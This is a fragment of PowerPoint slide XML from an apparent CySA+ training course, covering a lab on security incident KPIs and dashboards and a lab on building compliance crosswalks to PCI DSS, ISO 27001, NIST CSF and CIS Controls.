          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Compute the KPIs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The CISO target is typically MTTD &lt; 30 min and MTTR-respond &lt; 60 min.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat &gt; kpis.py &lt;&lt;'EOF'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Plot the dashboard</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Open dashboard.png from Killercoda's file browser.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat &gt; dashboard.py &lt;&lt;'EOF'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Identify trends (CySA+ "Trends")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A spike in sev-1 month-over-month is the headline finding for the CISO slide.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ python3 - &lt;&lt;'EOF'</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879</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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4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28 — Hands-On Steps (cont'd)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21534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1534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05840" y="263118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2631186"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Critical vulnerabilities &amp; zero-day exposure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>CySA+ 4.1 names "Critical vulnerabilities and zero-days" as a top metric.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="21534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064508"/>
            <a:ext cx="91440" cy="21534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05840" y="4912614"/>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05840" y="4912614"/>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6" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="5486400" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: SLO scorecard</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>CySA+ 4.1 / 4.2 "SLOs".</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4866894"/>
            <a:ext cx="3977639" cy="5486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52360" y="4866894"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ cat &gt; slo.md &lt;&lt;'EOF'</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880</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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28 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Compute MTTD, MTTR-respond, MTTR-remediate, and alert volume from raw incident data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Plot a single-page KPI dashboard with matplotlib.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Identify monthly trends and SLO breaches.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Combine vulnerability KPIs (P1, zero-day, KEV) with incident KPIs into an executive scorecard.</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881</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Lab 29 — Compliance Reporting (PCI DSS / ISO 27001 / NIST CSF)</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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will produce a compliance crosswalk that maps your lab evidence to PCI DSS, ISO 27001 Annex A, NIST CSF, and CIS Controls v8 — the four frameworks CySA+ 2.1 / 4.1 expects you to recognise. This is the lab the auditor reads.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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882</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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4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29 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Why a crosswalk?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Most organisations are subject to multiple frameworks.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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695651"/>
            <a:ext cx="91440" cy="78455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05840" y="285932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05840" y="2859328"/>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6" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Pull the framework primary sources (free)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>For internal training, the open OWASP, OSSTMM, and CIS Benchmarks are also useful (CySA+ 2.1 names them).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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608222"/>
            <a:ext cx="91440" cy="78455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05840" y="3771899"/>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05840" y="3771899"/>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1" name="TextBox 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Build the crosswalk</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Save as crosswalk.md:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t># Control crosswalk — Lab evidence ↔ Frameworks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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005840" y="468447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05840" y="4684470"/>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28" name="TextBox 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Generate compliance evidence files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>For each control area, produce one named evidence file pointing at the underlying lab artefact:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ sha256sum *.md *.csv *.html &gt; MANIFEST.sha256</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Rectangle 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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5840" y="5597041"/>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5840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="TextBox 34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Compliance report skeleton</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Rectangle 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t># Compliance Report — Q2 2026</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 3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39" name="TextBox 3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0" name="TextBox 3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883</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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4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29 — Hands-On Steps (cont'd)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21534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1534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05840" y="263118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2631186"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: The auditor's checklist</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Before submission, verify:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="21534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064508"/>
            <a:ext cx="91440" cy="21534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05840" y="4912614"/>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05840" y="4912614"/>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6" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="9509760" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
